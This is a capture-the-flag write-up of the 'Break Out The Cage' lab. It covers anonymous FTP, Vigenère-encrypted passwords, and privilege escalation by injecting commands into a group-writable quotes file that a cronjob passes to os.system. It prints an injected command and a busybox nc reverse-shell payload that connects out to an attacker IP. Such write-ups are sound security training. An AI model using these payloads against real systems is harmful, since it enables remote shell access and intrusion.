# Break Out The Cage

### Investigate!
Nmap scan shows ports 21,22 and 80 open. 
The FTP server allows anonymous login and it contains a file called `dad_tasks`. This file contains a base64 encoded strings, but If I try to decode it: <br />

It looks still encrypted somehow. I tried everything, such as rotating, caesar cipher and other stuff but nothing. <br />
Then I found [this online tool](https://www.boxentriq.com/code-breaking/cipher-identifier) that tries to indentify what type of cipher has been used based on the ciphertext: <br />

There's this other [online tool](https://www.guballa.de/vigenere-solver) that can be used to break this cipher and get watson ssh password. I need to move to the account `cage` to get the user flag. If I run `sudo -l`, I get: <br />

But this seams useless, it just prints stuff on the console. Further enumerating the machine, I found something interesting inside `/opt`:<br />

This is the code of the python script: <br />

This script is a cronjob, because once in a while I see some random banners appearing on the console. It basically selects all the strings from a file called `.quotes`, and then shows one of them on the screen with `os.system("wall " + quote)`. Now here's the interesting part: <br />
![image](https://github.com/user-attachments/assets/5d725f6b-87f7-4bda-9a92-423478316d2e)<br />
I am part of the `cage` group, and the `cage` group has write access to this `.quotes` file. This means that I can change this file and try to inject a command, such as a reverse shell, inside `os.system("wall " + quote)` to execute something like `wall ""; whoami #"`. Let's try it.<br />
I modified the `.quotes` file as such: <br />

And it works!: <br />

To spawn a reverse shell, I used this payload: `$(busybox nc 10.11.85.53 9001 -e sh)`, and got the user flag. Now, in cage's home directory, there's this email: <br />

This is again using vigen√®re cipher, and the key is `FACE`:<br />

The decoded word is the root password.
